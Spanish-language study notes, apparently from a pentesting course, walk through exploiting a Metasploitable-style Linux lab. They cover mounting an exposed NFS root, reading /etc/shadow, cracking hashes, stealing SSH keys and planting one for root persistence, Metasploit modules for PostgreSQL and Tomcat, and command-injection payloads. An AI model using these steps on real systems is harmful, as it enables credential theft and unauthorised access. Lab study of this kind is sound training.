

> [!info] Relacionado con
> [[Metodología de Explotación]] · [[Escalada de Privilegios]] · [[Reverse Shells y Post-Explotación]] · [[Prácticas CTF - HTB y VulnHub]]

---

## ① NFS — Network File System

Puerto **2049**. Permite compartir carpetas Linux por red.

### Flujo de explotación

```bash
# 1. Confirmar que NFS está activo
rpcinfo -p <IP>

# 2. Ver carpetas compartidas
showmount -e <IP>

# 3. Montar la raíz
mkdir ~/Desktop/carpeta_meta2
sudo mount -t nfs <IP>:/ ~/Desktop/carpeta_meta2

# 4. Explorar
cat ~/Desktop/carpeta_meta2/etc/passwd # usuarios
sudo cat ~/Desktop/carpeta_meta2/etc/shadow # hashes
```

> [!danger] PELIGRO
> Compartir `/` desde la raíz expone **todo** el sistema. Cualquier atacante puede leer `/etc/shadow` y modificar `authorized_keys`.

---

## ② Hashes — [[John_Hashcat|John]] y [[John_Hashcat|Hashcat]]

### Identificar tipo de hash

| Prefijo | Tipo | Hashcat modo |
|---------|------|-------------|
| `$1$` | MD5crypt | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `*` | Cuenta deshabilitada | — |
| `!` | Cuenta bloqueada | — |

### [[John_Hashcat|John the Ripper]]

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt # ver resultados
```

### [[John_Hashcat|Hashcat]]

```bash
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt # MD5crypt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt # SHA-512
hashcat -m 500 hashes.txt --show # ver resultados
```

| Herramienta | Cuándo usar |
|------------|------------|
| **[[John_Hashcat|John]]** | Más sencillo, detecta formato automáticamente |
| **[[John_Hashcat|Hashcat]]** | GPU → mucho más rápido. Entornos reales. |

---

## ③ SSH por NFS — Robar y crear claves

### Ficheros clave

| Archivo | Función |
|---------|---------|
| `~/.ssh/id_rsa` | Clave **PRIVADA** (la que se roba) |
| `~/.ssh/id_rsa.pub` | Clave pública (la que se deja en el servidor) |
| `~/.ssh/authorized_keys` | Lista de claves públicas autorizadas |

### Vector 1 — Robar clave privada

```bash
cp ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/id_rsa ~/Desktop/id_rsa_robada
chmod 600 ~/Desktop/id_rsa_robada # OBLIGATORIO
ssh -i ~/Desktop/id_rsa_robada root@<IP>
```

### Vector 2 — Crear nuestra clave (persistencia)

```bash
ssh-keygen -t rsa -f ~/Desktop/mi_clave_nueva
# Passphrase: Enter (vacío)

# AÑADIR (>>), NUNCA sobreescribir (>)
cat ~/Desktop/mi_clave_nueva.pub >> ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys

chmod 600 ~/Desktop/mi_clave_nueva
ssh -i ~/Desktop/mi_clave_nueva root@<IP>
```

> [!warning] >> vs >
> `>>` **añade** al final (persistencia).
> `>` **sobreescribe** y destruye accesos existentes.

---

## ④ PostgreSQL — Fuerza bruta y explotación

Puerto **5432**.

```bash
# Fuerza bruta con [[Metasploit]]
[[Metasploit|msfconsole]]
search postgres login
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <IP>
run
# → postgres:postgres (credenciales por defecto)

# Exploit autenticado
search postgres
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <IP>
set USERNAME postgres
set PASSWORD postgres
run
# → Shell como usuario "postgres"
```

---

## ⑤ Apache Tomcat — Reconocimiento y explotación

Puerto **8180**.

```bash
# Fuerza bruta del manager
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>
set RPORT 8180
run
# → tomcat:tomcat

# Exploit — subida de WAR
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
# → Shell como "tomcat55"
```

---

## ⑥ MySQL — Credenciales en robots.txt

Puerto **3306**.

```bash
# robots.txt → config.inc.php → credenciales en texto claro
mysql -h <IP> -u root -p
# Contraseña: vacía

show databases;
use dvwa;
select * from users;
```

---

## ⑦ Command Injection

```bash
# La app hace: ping -c1 <INPUT>
# Inyección:
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | id
```

| Separador | Comportamiento |
|----------|---------------|
| `;` | Ejecuta siempre ambos |
| `&&` | Ejecuta segundo si primero tiene éxito |
| `|` | Pipe: stdout → stdin |
| `||` | Ejecuta segundo si primero falla |

---

## Checklist de repaso

- [ ] ¿Sé montar un sistema NFS y explorarlo?
- [ ] ¿Puedo romper hashes con [[John_Hashcat|John]] y [[John_Hashcat|Hashcat]]?
- [ ] ¿Sé robar/crear claves SSH para persistencia?
- [ ] ¿Entiendo la diferencia entre `>>` y `>`?
- [ ] ¿Sé explotar PostgreSQL y Tomcat?
- [ ] ¿Reconozco un Command Injection y sé explotarlo?

---

## Enlaces relacionados

- [[comandos/SMB_Impacket]] — Cheat sheet de comandos
- [[comandos/John_Hashcat]] — Cheat sheet de comandos


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Hydra, John / Hashcat, Post-Explotación
- [[../../apuntes Joselu/PREWORK/resumen_clase13.md|resumen_clase13]] — Hydra, John / Hashcat, Post-Explotación
- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Netcat / Reverse Shells, Post-Explotación, Reverse Shells
- [[Prácticas CTF - HTB y VulnHub.md|Prácticas CTF - HTB y VulnHub]] — Hydra, Netcat / Reverse Shells, Post-Explotación
- [[Explotación de Máquinas Locales I — Oopsie y Archetype.md|Explotación de Máquinas Locales I — Oopsie y Archetype]] — Hydra, Netcat / Reverse Shells, Post-Explotación
- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Linux, Netcat / Reverse Shells, Post-Explotación

### 🛠️ Herramientas

- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]

> #command-injection #escalada-privilegios #hack-the-box #hydra #john #linux #netcat #pentest #post-explotacion #redes #reverse-shell #ssh #vulnhub #windows
